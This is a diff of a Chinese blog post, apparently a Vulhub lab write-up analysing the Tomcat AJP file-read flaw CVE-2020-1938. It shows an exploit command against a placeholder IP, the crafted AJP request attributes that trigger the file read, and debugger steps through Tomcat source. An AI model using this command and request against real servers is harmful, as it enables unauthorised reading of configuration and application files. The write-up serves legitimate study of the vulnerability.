@@ -12,12 +12,12 @@
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tomcat.py read_file --webapp=manager /META-INF/context.xml your-ip</span><br></pre></td></tr></table></figure>
 
 <p>成功读取到 index.jsp</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/a55d02b72206c11a2e8b4dc6fd486314.png" alt=""></p>
+<p><img src="a55d02b72206c11a2e8b4dc6fd486314.png" alt=""></p>
 <h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><blockquote>
 <p>测试环境为 Windows10</p>
 </blockquote>
 <h3 id="EXP-分析"><a href="#EXP-分析" class="headerlink" title="EXP 分析"></a>EXP 分析</h3><p>还是之前下载的 EXP，在 <code>tomcat.py</code> 的 <code>perform_request</code> 函数中插入一段代码，打印出发送的请求，如图所示</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/2f2981dff617117858e0ace796833c40.png" alt=""></p>
+<p><img src="2f2981dff617117858e0ace796833c40.png" alt=""></p>
 <p>打印出来的请求如下</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"prefix_code"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"method"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"protocol"</span>: <span class="string">"HTTP/1.1"</span>,</span><br><span class="line">    <span class="string">"req_uri"</span>: <span class="string">"/manager/xxxxx.jsp"</span>,</span><br><span class="line">    <span class="string">"remote_addr"</span>: <span class="string">"your-ip"</span>,</span><br><span class="line">    <span class="string">"remote_host"</span>: <span class="literal">None</span>,</span><br><span class="line">    <span class="string">"server_name"</span>: <span class="string">"your-ip"</span>,</span><br><span class="line">    <span class="string">"server_port"</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="string">"is_ssl"</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">"num_headers"</span>: <span class="literal">None</span>,</span><br><span class="line">    <span class="string">"request_headers"</span>: &#123;</span><br><span class="line">        <span class="string">"SC_REQ_ACCEPT"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_CONNECTION"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_HOST"</span>: <span class="string">"your-ip"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_USER_AGENT"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0"</span>,</span><br><span class="line">        <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, sdch"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"en-US,en;q=0.5"</span>,</span><br><span class="line">        <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"attributes"</span>: [</span><br><span class="line">        &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>)&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"req_attribute"</span>,</span><br><span class="line">            <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, <span class="string">"/META-INF/context.xml"</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>)&#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"data_direction"</span>: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -32,21 +32,21 @@
 <h4 id="配置-IDEA"><a href="#配置-IDEA" class="headerlink" title="配置 IDEA"></a>配置 IDEA</h4><p>下载 <a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.0.52/src/apache-tomcat-8.0.52-src.zip" target="_blank" rel="noopener">Tomcat 8.0.52 源码</a> 并解压出 <code>apache-tomcat-8.0.52-src</code> 目录</p>
 <p>选中 apache-tomcat-8.0.52-src –&gt; 右键 –&gt; Open Folder as IntelliJ IDEA Project</p>
 <p>点击右上角的配置</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/43296ea8b174561338dc10c955e922a6.png" alt=""></p>
+<p><img src="43296ea8b174561338dc10c955e922a6.png" alt=""></p>
 <p>点击 + 号 –&gt; 选择 Remote</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/bb903c7b1b2178b20c4e9e1535e31ffb.png" alt=""></p>
+<p><img src="bb903c7b1b2178b20c4e9e1535e31ffb.png" alt=""></p>
 <p>配置 ip 和端口改成之前设置的，classpath 选择 Tomcat</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/30b06670948feb4463fc812af47e4cc0.png" alt=""></p>
+<p><img src="30b06670948feb4463fc812af47e4cc0.png" alt=""></p>
 <p>点击虫虫图标开始 debug</p>
 <h4 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h4><p>首先是在 <code>org.apache.coyote.ajp.AbstractAjpProcessor#prepareRequest()</code> 中，通过 <code>request.setAttribute(n, v);</code> 将传入的 <code>javax.servlet.include.path_info</code> 保存到了 <code>request</code> 中</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/87f7f62edf19ca1aa0a99b29516f57b3.png" alt=""></p>
+<p><img src="87f7f62edf19ca1aa0a99b29516f57b3.png" alt=""></p>
 <p>到了 <code>org.apache.jasper.servlet.JspServlet#serviceJspFile()</code>，通过 <code>context.getResource(jspUri)</code> 读取数据</p>
 <blockquote>
 <p>路径必须是在 web.xml 中未定义的，warpper 才会为 null</p>
 </blockquote>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/900a9011281d8579a082cb079de21d68.png" alt=""></p>
+<p><img src="900a9011281d8579a082cb079de21d68.png" alt=""></p>
 <p>成功读取到文件</p>
-<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/cb6eddb09053e03c3c66dd84ba1bc4a4.png" alt=""></p>
+<p><img src="cb6eddb09053e03c3c66dd84ba1bc4a4.png" alt=""></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
 <li><a href="https://www.cnblogs.com/kangjunyun/p/11217740.html" target="_blank" rel="noopener">Tomcat 远程调试 - 漫天de光 - 博客园</a></li>
 <li><a href="https://www.freebuf.com/vuls/228108.html" target="_blank" rel="noopener">Apache AJP 协议 CVE-2020-1938 漏洞分析 - FreeBuf网络安全行业门户</a></li>
